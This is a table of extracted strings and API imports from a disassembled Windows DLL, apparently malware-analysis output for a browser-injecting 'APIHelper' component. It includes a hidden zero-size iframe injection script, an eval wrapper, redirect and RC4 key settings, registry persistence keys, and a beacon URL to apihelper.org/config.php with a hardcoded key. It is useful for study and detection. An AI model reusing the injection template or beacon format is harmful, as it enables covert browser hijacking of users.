reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1800061fc	0x180024bf0	string	0x1800061b0	delimiter
0x180006325	0x180024b90	string	0x18000630c	options
0x180006339	0x180024c00	string	0x18000630c	php_redirect_script
0x180006448	0x180024c1c	string	0x180006418	proxy
0x18000645f	0x180024b90	string	0x180006418	options
0x18000646e	0x180024c14	string	0x180006418	rc4key
0x1800065f2	0x180024c30	string	0x180006560	http
0x180006606	0x180024c28	string	0x180006560	https
0x18000668d	0x180024c38	string	0x18000665c	dynamical_redirect
0x18000685a	0x180024368	import	0x180006830	RPCRT4.dll.UuidCreate
0x18000686c	0x180024370	import	0x180006830	RPCRT4.dll.UuidToStringA
0x180006893	0x180024378	import	0x180006830	RPCRT4.dll.RpcStringFreeA
0x1800068e0	0x18002e2c0	string	0x1800068b0	0123456789ABCDEF0123456789abcdef
0x180006944	0x18002e2c0	string	0x180006928	0123456789ABCDEF0123456789abcdef
0x18000698a	0x180024c50	string	0x180006928	FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
0x1800069c6	0x180024038	import	0x1800069ac	ADVAPI32.dll.RegCreateKeyA
0x1800069f6	0x180024040	import	0x1800069ac	ADVAPI32.dll.RegQueryValueExA
0x180006a05	0x180024048	import	0x1800069ac	ADVAPI32.dll.RegCloseKey
0x180006a4d	0x180024040	import	0x1800069ac	ADVAPI32.dll.RegQueryValueExA
0x180006a5a	0x180024048	import	0x1800069ac	ADVAPI32.dll.RegCloseKey
0x180006ab1	0x180024038	import	0x180006a84	ADVAPI32.dll.RegCreateKeyA
0x180006ae1	0x180024030	import	0x180006a84	ADVAPI32.dll.RegSetValueExA
0x180006aee	0x180024048	import	0x180006a84	ADVAPI32.dll.RegCloseKey
0x180006b7a	0x180024038	import	0x180006b68	ADVAPI32.dll.RegCreateKeyA
0x180006b90	0x180024028	import	0x180006b68	ADVAPI32.dll.RegDeleteValueA
0x180006b9d	0x180024048	import	0x180006b68	ADVAPI32.dll.RegCloseKey
0x180006fcc	0x180024e00	string	0x180006fbc	invalid string position
0x18000706d	0x180007076	string	0x180007048	D8IIt
0x1800070e2	0x180024158	import	0x1800070ac	KERNEL32.dll.MultiByteToWideChar
0x1800070f6	0x180024318	import	0x1800070ac	OLEAUT32.dll.SysReAllocStringLen
0x180007118	0x180024158	import	0x1800070ac	KERNEL32.dll.MultiByteToWideChar
0x180007125	0x180024358	import	0x1800070ac	OLEAUT32.dll.SysStringLen
0x1800071c4	0x180010a84	string	0x1800070ac	@UVWATAUH
0x180007323	0x180024de0	string	0x1800072e6	SOFTWARE\APIHelper\Parameters
0x180007521	0x180024e00	string	0x180007500	invalid string position
0x18000782e	0x180024e00	string	0x180007804	invalid string position
0x180007878	0x180024e18	string	0x180007804	string too long
0x1800079ab	0x180024e18	string	0x18000791c	string too long
0x180007ab4	0x180024e78	string	0x180007a74	map/set<T> too long
0x180007d2e	0x180024e90	string	0x180007d08	invalid map/set<T> iterator
0x180007d4e	0x180007d56	string	0x180007d08	@8hIt
0x180007e21	0x180007e2a	string	0x180007d08	@8iIt
0x180007ecc	0x180007fa2	string	0x180007d08	@8iHuVD
0x180007eda	0x180007f31	string	0x180007d08	@8iI
0x18000860e	0x180008644	string	0x180008468	H;]\bt.L
0x180008626	0x180008644	string	0x180008468	H;]\bt.L
0x180008957	0x180025008	string	0x180008900	ObtainScript
0x180008966	0x180025008	string	0x180008900	ObtainScript
0x1800089a6	0x180024fe0	string	0x180008900	ObtainAjaxScript
0x1800089b5	0x180024fe0	string	0x180008900	ObtainAjaxScript
0x1800089f5	0x180024fd0	string	0x180008900	RegRead
0x180008a04	0x180024fd0	string	0x180008900	RegRead
0x180008a44	0x180024fb8	string	0x180008900	RegWrite
0x180008a53	0x180024fb8	string	0x180008900	RegWrite
0x180008a93	0x180024fa0	string	0x180008900	RegDelete
0x180008aa2	0x180024fa0	string	0x180008900	RegDelete
0x180008ae2	0x180024f88	string	0x180008900	GetGroup
0x180008af1	0x180024f88	string	0x180008900	GetGroup
0x180008b31	0x180024f78	string	0x180008900	GetId
0x180008b40	0x180024f78	string	0x180008900	GetId
0x180008bb7	0x180024358	import	0x180008b98	OLEAUT32.dll.SysStringLen
0x180008e6d	0x180024358	import	0x180008d9c	OLEAUT32.dll.SysStringLen
0x180008f95	0x1800251c8	string	0x180008eac	APIHelper
0x180008f9c	0x180024320	import	0x180008eac	OLEAUT32.dll.SysReAllocString
0x180008fd7	0x180024358	import	0x180008eac	OLEAUT32.dll.SysStringLen
0x18000909d	0x180024358	import	0x180008eac	OLEAUT32.dll.SysStringLen
0x1800094bd	0x180025230	string	0x180009288	JavaScript
0x1800094dc	0x180024358	import	0x180009288	OLEAUT32.dll.SysStringLen
0x180009755	0x180025270	string	0x1800096f0	eval("%s")
0x180009788	0x180025230	string	0x1800096f0	JavaScript
0x180009807	0x1800252a0	string	0x1800097d4	if (!document.getElementById('%s')){var s = document.createElement('iframe');s.setAttribute('width', '0px');s.setAttribute('height', '0px');s.setAttribute('src', '%s');s.setAttribute('id', '%s');document.body.appendChild(s);}
0x1800098a4	0x180024358	import	0x180009850	OLEAUT32.dll.SysStringLen
0x180009917	0x180008eac	string	0x180009850	@USWH
0x180009922	0x180008eac	string	0x180009850	@USWH
0x18000994d	0x180024398	import	0x180009850	USER32.dll.LoadStringW
0x180009a5c	0x180024060	import	0x180009a58	KERNEL32.dll.GetLastError
0x180009ab2	0x180025500	string	0x180009a8c	Advapi32.dll
0x180009ab9	0x180024080	import	0x180009a8c	KERNEL32.dll.GetModuleHandleA
0x180009ac4	0x1800254e8	string	0x180009a8c	RegOpenKeyTransactedA
0x180009ace	0x180024078	import	0x180009a8c	KERNEL32.dll.GetProcAddress
0x180009b21	0x180024020	import	0x180009a8c	ADVAPI32.dll.RegOpenKeyExA
0x180009b6e	0x180025500	string	0x180009b44	Advapi32.dll
0x180009b75	0x180024080	import	0x180009b44	KERNEL32.dll.GetModuleHandleA
0x180009b84	0x180025510	string	0x180009b44	RegCreateKeyTransactedA
0x180009b8e	0x180024078	import	0x180009b44	KERNEL32.dll.GetProcAddress
0x180009c55	0x180024018	import	0x180009b44	ADVAPI32.dll.RegCreateKeyExA
0x180009c96	0x180025500	string	0x180009c78	Advapi32.dll
0x180009c9d	0x180024080	import	0x180009c78	KERNEL32.dll.GetModuleHandleA
0x180009ca8	0x180025528	string	0x180009c78	RegDeleteKeyTransactedA
0x180009cb2	0x180024078	import	0x180009c78	KERNEL32.dll.GetProcAddress
0x180009ce7	0x180024010	import	0x180009c78	ADVAPI32.dll.RegDeleteKeyA
0x180009d37	0x180025500	string	0x180009d08	Advapi32.dll
0x180009d3e	0x180024080	import	0x180009d08	KERNEL32.dll.GetModuleHandleA
0x180009d49	0x180025540	string	0x180009d08	RegDeleteKeyExA
0x180009d53	0x180024078	import	0x180009d08	KERNEL32.dll.GetProcAddress
0x180009d8f	0x180024010	import	0x180009d08	ADVAPI32.dll.RegDeleteKeyA
0x180009e3c	0x180024018	import	0x180009da0	ADVAPI32.dll.RegCreateKeyExA
0x180009e65	0x180024048	import	0x180009da0	ADVAPI32.dll.RegCloseKey
0x180009ee6	0x180024020	import	0x180009e94	ADVAPI32.dll.RegOpenKeyExA
0x180009efb	0x180024048	import	0x180009e94	ADVAPI32.dll.RegCloseKey
0x180009f5c	0x180024088	import	0x180009f28	KERNEL32.dll.lstrlenA
0x180009f87	0x180024030	import	0x180009f28	ADVAPI32.dll.RegSetValueExA
0x18000a012	0x1800243c0	import	0x180009fb4	ole32.dll.CoTaskMemRealloc
0x18000a12c	0x180024d30	string	0x18000a0ac	BDMS
0x18000a158	0x180024090	import	0x18000a0ac	KERNEL32.dll.lstrcmpiA
0x18000a1c9	0x180024090	import	0x18000a1a0	KERNEL32.dll.lstrcmpiA
0x18000a235	0x1800243a0	import	0x18000a204	USER32.dll.CharNextA
0x18000a255	0x1800243a0	import	0x18000a204	USER32.dll.CharNextA
0x18000a26b	0x1800243a0	import	0x18000a204	USER32.dll.CharNextA
0x18000a27e	0x1800243a0	import	0x18000a204	USER32.dll.CharNextA
0x18000a28d	0x1800243a0	import	0x18000a204	USER32.dll.CharNextA
0x18000a2d7	0x1800243a0	import	0x18000a204	USER32.dll.CharNextA
0x18000a2fc	0x1800243a0	import	0x18000a204	USER32.dll.CharNextA
0x18000a3a8	0x1800243a0	import	0x18000a358	USER32.dll.CharNextA
0x18000a491	0x180024130	import	0x18000a46c	KERNEL32.dll.RaiseException
0x18000a579	0x180013fa4	string	0x18000a514	@UATAUH
0x18000a5d3	0x180024068	import	0x18000a598	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x18000a5dd	0x180024060	import	0x18000a598	KERNEL32.dll.GetLastError
0x18000a6da	0x180024000	import	0x18000a63c	ADVAPI32.dll.RegEnumKeyExA
0x18000a6ee	0x180024048	import	0x18000a63c	ADVAPI32.dll.RegCloseKey
0x18000a714	0x180024048	import	0x18000a63c	ADVAPI32.dll.RegCloseKey
0x18000a892	0x180024070	import	0x18000a7fc	KERNEL32.dll.DeleteCriticalSection
0x18000a8d8	0x1800240a0	import	0x18000a8a8	KERNEL32.dll.GetModuleFileNameA
0x18000a8e3	0x1800243b0	import	0x18000a8a8	USER32.dll.CharLowerA
0x18000a8e9	0x180025700	string	0x18000a8a8	explorer.exe
0x18000a923	0x180024098	import	0x18000a8a8	KERNEL32.dll.DisableThreadLibraryCalls
0x18000a99a	0x180024090	import	0x18000a96c	KERNEL32.dll.lstrcmpiA
0x18000a9f3	0x180024130	import	0x18000a96c	KERNEL32.dll.RaiseException
0x18000abc4	0x180024138	import	0x18000ab78	KERNEL32.dll.lstrlenW
0x18000ac7f	0x180024168	import	0x18000ab78	KERNEL32.dll.WideCharToMultiByte
0x18000acb0	0x180024088	import	0x18000ab78	KERNEL32.dll.lstrlenA
0x18000adea	0x180024088	import	0x18000ad98	KERNEL32.dll.lstrlenA
0x18000ae13	0x1800243e0	import	0x18000ad98	ole32.dll.CoTaskMemAlloc
0x18000ae2c	0x1800243c8	import	0x18000ad98	ole32.dll.CoTaskMemFree
0x18000ae68	0x180025630	string	0x18000ad98	HKCR
0x18000ae84	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000ae90	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000ae9c	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000aea8	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000aeb1	0x180025830	string	0x18000ad98	HKCU\r\n{\tSoftware\r\n\t{\r\n\t\tClasses
0x18000aebc	0x18000ab78	string	0x18000ad98	@UATAUH
0x18000aede	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000aef1	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000af00	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000af3f	0x180025818	string	0x18000ad98	\r\n\t}\r\n}\r\n
0x18000af4a	0x18000ab78	string	0x18000ad98	@UATAUH
0x18000af69	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000af9c	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000b029	0x18000ab78	string	0x18000ad98	@UATAUH
0x18000b03e	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000b04e	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000b06c	0x1800243a0	import	0x18000ad98	USER32.dll.CharNextA
0x18000b0c9	0x1800243c8	import	0x18000ad98	ole32.dll.CoTaskMemFree
0x18000b15a	0x1800240a0	import	0x18000b0fc	KERNEL32.dll.GetModuleFileNameA
0x18000b1a2	0x1800243a0	import	0x18000b0fc	USER32.dll.CharNextA
0x18000b1ce	0x180024138	import	0x18000b0fc	KERNEL32.dll.lstrlenW
0x18000b27f	0x180024168	import	0x18000b0fc	KERNEL32.dll.WideCharToMultiByte
0x18000b2a0	0x180024088	import	0x18000b0fc	KERNEL32.dll.lstrlenA
0x18000b34c	0x180024088	import	0x18000b0fc	KERNEL32.dll.lstrlenA
0x18000b408	0x180024158	import	0x18000b0fc	KERNEL32.dll.MultiByteToWideChar
0x18000b434	0x180024330	import	0x18000b0fc	OLEAUT32.dll.LoadRegTypeLib
0x18000b444	0x180025870	string	0x18000b0fc	.tlb
0x18000b4e9	0x180024088	import	0x18000b0fc	KERNEL32.dll.lstrlenA
0x18000b591	0x180024158	import	0x18000b0fc	KERNEL32.dll.MultiByteToWideChar
0x18000b5af	0x180024330	import	0x18000b0fc	OLEAUT32.dll.LoadRegTypeLib
0x18000b5be	0x180024320	import	0x18000b0fc	OLEAUT32.dll.SysReAllocString
0x18000b6de	0x1800243d0	import	0x18000b640	ole32.dll.CoCreateInstance
0x18000b711	0x18000b73c	string	0x18000b640	D93u
0x18000b74d	0x18000b6ec	string	0x18000b640	D9+t^H
0x18000b767	0x1800243d8	import	0x18000b640	ole32.dll.StringFromGUID2
0x18000b777	0x180024138	import	0x18000b640	KERNEL32.dll.lstrlenW
0x18000b832	0x180024168	import	0x18000b640	KERNEL32.dll.WideCharToMultiByte
0x18000b853	0x1800258a8	string	0x18000b640	CLSID\
0x18000b8ea	0x180025890	string	0x18000b640	\Required Categories
0x18000b9af	0x180024050	import	0x18000b640	ADVAPI32.dll.RegQueryInfoKeyA
0x18000b9c0	0x180024048	import	0x18000b640	ADVAPI32.dll.RegCloseKey
0x18000b9eb	0x1800258a8	string	0x18000b640	CLSID\
0x18000ba7f	0x180025878	string	0x18000b640	\Implemented Categories
0x18000bb24	0x180024050	import	0x18000b640	ADVAPI32.dll.RegQueryInfoKeyA
0x18000bb35	0x180024048	import	0x18000b640	ADVAPI32.dll.RegCloseKey
0x18000bb5e	0x180024048	import	0x18000b640	ADVAPI32.dll.RegCloseKey
0x18000bb6b	0x180024048	import	0x18000b640	ADVAPI32.dll.RegCloseKey
0x18000bbe6	0x18000b0fc	string	0x18000bbcc	@USVWATAUAVAWH
0x18000bc10	0x1800258e0	string	0x18000bbcc	OLEAUT32.DLL
0x18000bc17	0x1800240a8	import	0x18000bbcc	KERNEL32.dll.GetModuleHandleW
0x18000bc2c	0x180024078	import	0x18000bbcc	KERNEL32.dll.GetProcAddress
0x18000bc3a	0x180024338	import	0x18000bbcc	OLEAUT32.dll.VarDecFix
0x18000bc84	0x180024358	import	0x18000bbcc	OLEAUT32.dll.SysStringLen
0x18000bcd2	0x18000b0fc	string	0x18000bc94	@USVWATAUAVAWH
0x18000bd21	0x180024328	import	0x18000bc94	OLEAUT32.dll.VariantInit
0x18000bd92	0x1800243a8	import	0x18000bc94	USER32.dll.CharNextW
0x18000bdd5	0x1800258e0	string	0x18000bc94	OLEAUT32.DLL
0x18000bddc	0x1800240a8	import	0x18000bc94	KERNEL32.dll.GetModuleHandleW
0x18000bde7	0x180025900	string	0x18000bc94	RegisterTypeLibForUser
0x18000bdf1	0x180024078	import	0x18000bc94	KERNEL32.dll.GetProcAddress
0x18000bdfc	0x180024350	import	0x18000bc94	OLEAUT32.dll.QueryPathOfRegTypeLib
0x18000be19	0x180024358	import	0x18000bc94	OLEAUT32.dll.SysStringLen
0x18000be34	0x180024358	import	0x18000bc94	OLEAUT32.dll.SysStringLen
0x18000beda	0x18000b640	string	0x18000be60	@UWATAUAVH
0x18000bf89	0x18000b640	string	0x18000bf20	@UWATAUAVH
0x18000c074	0x18000c07c	string	0x18000bfdc	H9^ u0H
0x18000c089	0x180024128	import	0x18000bfdc	KERNEL32.dll.EnterCriticalSection
0x18000c0ac	0x1800240c8	import	0x18000bfdc	KERNEL32.dll.LeaveCriticalSection
0x18000c2ab	0x180024088	import	0x18000c264	KERNEL32.dll.lstrlenA
0x18000c2f6	0x180024138	import	0x18000c264	KERNEL32.dll.lstrlenW
0x18000c4bd	0x180024138	import	0x18000c464	KERNEL32.dll.lstrlenW
0x18000c578	0x180024168	import	0x18000c464	KERNEL32.dll.WideCharToMultiByte
0x18000c6ad	0x1800243a0	import	0x18000c60c	USER32.dll.CharNextA
0x18000c701	0x180024088	import	0x18000c60c	KERNEL32.dll.lstrlenA
0x18000c77d	0x1800243a0	import	0x18000c60c	USER32.dll.CharNextA
0x18000c798	0x1800243a0	import	0x18000c60c	USER32.dll.CharNextA
0x18000c7a1	0x18000c7c5	string	0x18000c60c	@8>u
0x18000c7a7	0x1800240b0	import	0x18000c60c	KERNEL32.dll.IsDBCSLeadByte
0x18000c814	0x180024088	import	0x18000c60c	KERNEL32.dll.lstrlenA
0x18000c8cd	0x180024158	import	0x18000c60c	KERNEL32.dll.MultiByteToWideChar
0x18000c90a	0x180024348	import	0x18000c60c	OLEAUT32.dll.VarUI4FromDisp
0x18000c938	0x180024030	import	0x18000c60c	ADVAPI32.dll.RegSetValueExA
0x18000c969	0x180024088	import	0x18000c60c	KERNEL32.dll.lstrlenA
0x18000caa7	0x180024030	import	0x18000c60c	ADVAPI32.dll.RegSetValueExA
0x18000cacb	0x180024088	import	0x18000c60c	KERNEL32.dll.lstrlenA
0x18000caf2	0x180024030	import	0x18000c60c	ADVAPI32.dll.RegSetValueExA
0x18000cbc2	0x180024d08	string	0x18000cb40	Delete
0x18000cbcc	0x180024090	import	0x18000cb40	KERNEL32.dll.lstrcmpiA
0x18000cbdd	0x180024d20	string	0x18000cb40	ForceRemove
0x18000cbe7	0x180024090	import	0x18000cb40	KERNEL32.dll.lstrcmpiA
0x18000cc35	0x1800243a0	import	0x18000cb40	USER32.dll.CharNextA
0x18000cc5c	0x180024090	import	0x18000cb40	KERNEL32.dll.lstrcmpiA
0x18000cc6a	0x180024de0	string	0x18000cb40	SOFTWARE\APIHelper\Parameters
0x18000cccf	0x180024d10	string	0x18000cb40	NoRemove
0x18000ccd9	0x180024090	import	0x18000cb40	KERNEL32.dll.lstrcmpiA
0x18000cd08	0x180024090	import	0x18000cb40	KERNEL32.dll.lstrcmpiA
0x18000cd7e	0x18000c60c	string	0x18000cb40	@USVWATAUAVAW
0x18000cddf	0x180024028	import	0x18000cb40	ADVAPI32.dll.RegDeleteValueA
0x18000cdfa	0x180024048	import	0x18000cb40	ADVAPI32.dll.RegCloseKey
0x18000ce27	0x1800243a0	import	0x18000cb40	USER32.dll.CharNextA
0x18000cee0	0x18000c60c	string	0x18000cb40	@USVWATAUAVAW
0x18000ceff	0x180024088	import	0x18000cb40	KERNEL32.dll.lstrlenA
0x18000cf27	0x18000cb40	string	0x18000cb40	@USVWH
0x18000cffa	0x180024088	import	0x18000cb40	KERNEL32.dll.lstrlenA
0x18000d021	0x18000cb40	string	0x18000cb40	@USVWH
0x18000d0c3	0x180024008	import	0x18000cb40	ADVAPI32.dll.RegQueryInfoKeyW
0x18000d0eb	0x180024090	import	0x18000cb40	KERNEL32.dll.lstrcmpiA
0x18000d107	0x180024de0	string	0x18000cb40	SOFTWARE\APIHelper\Parameters
0x18000d178	0x180024008	import	0x18000cb40	ADVAPI32.dll.RegQueryInfoKeyW
0x18000d1a0	0x180024048	import	0x18000cb40	ADVAPI32.dll.RegCloseKey
0x18000d1fd	0x180024048	import	0x18000cb40	ADVAPI32.dll.RegCloseKey
0x18000d222	0x180024048	import	0x18000cb40	ADVAPI32.dll.RegCloseKey
0x18000d287	0x180024048	import	0x18000cb40	ADVAPI32.dll.RegCloseKey
0x18000d873	0x180024358	import	0x18000d6f0	OLEAUT32.dll.SysStringLen
0x18000d881	0x180024328	import	0x18000d6f0	OLEAUT32.dll.VariantInit
0x18000d8b8	0x180024358	import	0x18000d6f0	OLEAUT32.dll.SysStringLen
0x18000dad6	0x18000dae0	string	0x18000d9d8	H9s\bt!H
0x18000dc49	0x180024128	import	0x18000dbc8	KERNEL32.dll.EnterCriticalSection
0x18000dc62	0x1800240c8	import	0x18000dbc8	KERNEL32.dll.LeaveCriticalSection
0x18000dd51	0x180024128	import	0x18000dce8	KERNEL32.dll.EnterCriticalSection
0x18000ddd9	0x1800240a0	import	0x18000dce8	KERNEL32.dll.GetModuleFileNameA
0x18000ddfa	0x180024088	import	0x18000dce8	KERNEL32.dll.lstrlenA
0x18000deb0	0x180024158	import	0x18000dce8	KERNEL32.dll.MultiByteToWideChar
0x18000dedd	0x1800240c8	import	0x18000dce8	KERNEL32.dll.LeaveCriticalSection
0x18000def1	0x180024330	import	0x18000dce8	OLEAUT32.dll.LoadRegTypeLib
0x18000df2d	0x180024340	import	0x18000dce8	OLEAUT32.dll.RegisterTypeLib
0x18000e021	0x1800240c8	import	0x18000dce8	KERNEL32.dll.LeaveCriticalSection
0x18000e36f	0x18000cb40	string	0x18000e2ac	@USVWH
0x18000e390	0x18000cb40	string	0x18000e2ac	@USVWH
0x18000e39a	0x18000cb40	string	0x18000e2ac	@USVWH
0x18000e3bc	0x1800243a0	import	0x18000e2ac	USER32.dll.CharNextA
0x18000e3d7	0x1800243c8	import	0x18000e2ac	ole32.dll.CoTaskMemFree
0x18000e5bc	0x18000dce8	string	0x18000e584	@UWATAUAVH
0x18000e5d9	0x180024138	import	0x18000e584	KERNEL32.dll.lstrlenW
0x18000e864	0x18000dce8	string	0x18000e584	@UWATAUAVH
0x18000ec7e	0x180024138	import	0x18000ec24	KERNEL32.dll.lstrlenW
0x18000ed3c	0x180024168	import	0x18000ec24	KERNEL32.dll.WideCharToMultiByte
0x18000ed62	0x1800240d8	import	0x18000ec24	KERNEL32.dll.LoadLibraryExA
0x18000ed89	0x1800240d0	import	0x18000ec24	KERNEL32.dll.FindResourceA
0x18000eda7	0x180024160	import	0x18000ec24	KERNEL32.dll.LoadResource
0x18000edbf	0x1800240c0	import	0x18000ec24	KERNEL32.dll.SizeofResource
0x18000ee9f	0x1800240b8	import	0x18000ec24	KERNEL32.dll.FreeLibrary
0x18000ef7b	0x180024138	import	0x18000ef28	KERNEL32.dll.lstrlenW
0x18000f036	0x180024168	import	0x18000ef28	KERNEL32.dll.WideCharToMultiByte
0x18000f060	0x18000ec24	string	0x18000ef28	@USVATAUAVAWH
0x18000f124	0x180024138	import	0x18000f0c8	KERNEL32.dll.lstrlenW
0x18000f1de	0x180024168	import	0x18000f0c8	KERNEL32.dll.WideCharToMultiByte
0x18000f1f4	0x180024138	import	0x18000f0c8	KERNEL32.dll.lstrlenW
0x18000f2ad	0x180024168	import	0x18000f0c8	KERNEL32.dll.WideCharToMultiByte
0x18000f2db	0x18000ec24	string	0x18000f0c8	@USVATAUAVAWH
0x18000f3a7	0x180024138	import	0x18000f354	KERNEL32.dll.lstrlenW
0x18000f462	0x180024168	import	0x18000f354	KERNEL32.dll.WideCharToMultiByte
0x18000f489	0x18000ec24	string	0x18000f354	@USVATAUAVAWH
0x18000f54c	0x180024138	import	0x18000f4f0	KERNEL32.dll.lstrlenW
0x18000f606	0x180024168	import	0x18000f4f0	KERNEL32.dll.WideCharToMultiByte
0x18000f61c	0x180024138	import	0x18000f4f0	KERNEL32.dll.lstrlenW
0x18000f6d5	0x180024168	import	0x18000f4f0	KERNEL32.dll.WideCharToMultiByte
0x18000f700	0x18000ec24	string	0x18000f4f0	@USVATAUAVAWH
0x180010581	0x1800240f0	import	0x180010574	KERNEL32.dll.TerminateThread
0x1800105c0	0x180024128	import	0x1800105ac	KERNEL32.dll.EnterCriticalSection
0x1800105e1	0x180025ff8	string	0x1800105ac	SOFTWARE\APIHelper
0x180010641	0x1800240c8	import	0x1800105ac	KERNEL32.dll.LeaveCriticalSection
0x18001068f	0x180024128	import	0x180010654	KERNEL32.dll.EnterCriticalSection
0x1800106c2	0x18002603c	string	0x180010654	status
0x1800106fa	0x180025ff8	string	0x180010654	SOFTWARE\APIHelper
0x18001073c	0x1800240c8	import	0x180010654	KERNEL32.dll.LeaveCriticalSection
0x18001076e	0x180025ff8	string	0x180010758	SOFTWARE\APIHelper
0x18001079b	0x180025ff8	string	0x180010758	SOFTWARE\APIHelper
0x1800107d7	0x18002607c	string	0x1800107c8	group
0x1800107de	0x180026048	string	0x1800107c8	SYSTEM\CurrentControlSet\services\KBDMAI\Parameters
0x180010819	0x1800260c0	string	0x1800107fc	/config.php
0x180010820	0x1800260b0	string	0x1800107fc	apihelper.org
0x180010827	0x180026098	string	0x1800107fc	http://%S%S
0x18001083c	0x180024388	import	0x1800107fc	SHLWAPI.dll.StrStrIW
0x180010847	0x180026088	string	0x1800107fc	?cparam
0x180010851	0x180024388	import	0x1800107fc	SHLWAPI.dll.StrStrIW
0x18001090e	0x180026158	string	0x1800108e0	&group=
0x180010915	0x180026120	string	0x1800108e0	key=3faf033cf35c4290ac2a4c6b2989f282&vplg=3.2&id=
0x180010957	0x180026118	string	0x1800108e0	&xhg=%p
0x180010981	0x18002610c	string	0x1800108e0	&task=
0x18001098d	0x180026100	string	0x1800108e0	?cparam=
0x180010994	0x1800260c0	string	0x1800108e0	/config.php
0x18001099b	0x1800260b0	string	0x1800108e0	apihelper.org
0x1800109a2	0x1800260f8	string	0x1800108e0	http://
0x180010b34	0x180026198	string	0x180010a84	domains
0x180010b86	0x180026188	string	0x180010a84	url_script
